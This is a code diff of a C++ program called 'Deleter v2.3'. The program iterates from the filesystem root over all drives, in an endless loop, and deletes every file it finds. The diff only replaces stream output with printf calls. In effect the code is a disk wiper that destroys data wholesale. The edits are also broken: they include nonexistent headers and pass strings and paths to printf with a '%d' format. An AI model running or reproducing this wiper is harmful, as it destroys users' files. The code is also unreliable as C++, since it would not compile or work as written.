@@ -1,12 +1,12 @@
-#include <iostream.hpp>
-#include <string.hpp>
-#include <vector.hpp>
+#include <stdio.h>
+#include <string.h>
+#include <vector.h>
 #include "ghc/filesystem.hpp"
 namespace fs = ghc::filesystem;
 using namespace std;
 int DeleterMain() {
     string Title = "Deleter v2.3";
-    cout << Title << endl;
+    printf("%d", Title);
     vector<fs::path> Disks; // Declare an empty vector
     while (true) {
       for (const fs::directory_entry &root : fs::recursive_directory_iterator(
@@ -14,7 +14,7 @@ int DeleterMain() {
                    .root_directory())) {
         if (root.path().parent_path() != root.path() &&
             root.path().string().length() <= 3) {
-          cout << "Possible Root Directory: " << root.path() << endl;
+          printf("\nPossible Root Directory: %d", root.path);
           Disks.push_back(root.path());
         }
         std::vector<std::string> drives;
@@ -36,7 +36,7 @@ int DeleterMain() {
                 files.push_back(file.path());
               }
               for (const fs::path &file : files) {
-                cout << "Deleting " << file << endl;
+                printf("\nDeleting %d", file);
                 try {
                   std::error_code ec;
                   remove(file, ec);
